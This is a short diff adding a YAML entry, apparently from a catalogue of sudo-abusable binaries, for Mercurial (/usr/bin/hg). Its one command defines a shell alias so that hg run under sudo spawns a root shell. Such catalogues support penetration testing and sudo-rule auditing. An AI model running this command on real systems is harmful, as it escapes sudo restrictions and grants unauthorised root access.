@@ -1,0 +1,4 @@
+name: hg
+binary_path: /usr/bin/hg
+exploit_cmds:
+- sudo /usr/bin/hg --config alias.x='!/bin/sh' x
